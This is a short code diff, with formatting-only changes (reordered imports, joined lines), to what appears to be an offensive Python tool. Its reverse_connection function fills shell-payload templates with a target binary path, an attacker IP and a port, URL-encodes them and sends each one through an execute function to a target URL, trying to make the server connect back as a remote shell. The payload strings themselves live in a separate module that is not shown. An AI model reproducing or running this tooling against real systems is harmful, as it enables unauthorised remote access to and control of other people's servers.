@@ -1,6 +1,8 @@
-import requests
-from data import payloads
 import urllib.parse
+
+import requests
+
+from data import payloads
 
 
 def execute(url: str, command: str) -> str:
@@ -27,14 +29,10 @@ def find_bins(url: str) -> list:
 def reverse_connection(valid_bins: list, url: str, ip: str, port: int):
     print(f"Bins to test: {len(valid_bins)}")
     for bin in valid_bins:
-        print(
-            f"[!] Attempting {list(bin.keys())[0]} payloads for path {list(bin.values())[0]}"
-        )
+        print(f"[!] Attempting {list(bin.keys())[0]} payloads for path {list(bin.values())[0]}")
         for payload in payloads.payloads[list(bin.keys())[0]]:
             cmd = urllib.parse.quote(
-                payload.replace("PATHHERE", list(bin.values())[0])
-                .replace("IPHERE", ip)
-                .replace("PORTHERE", str(port))
+                payload.replace("PATHHERE", list(bin.values())[0]).replace("IPHERE", ip).replace("PORTHERE", str(port))
             )
             print(execute(url, cmd))
 
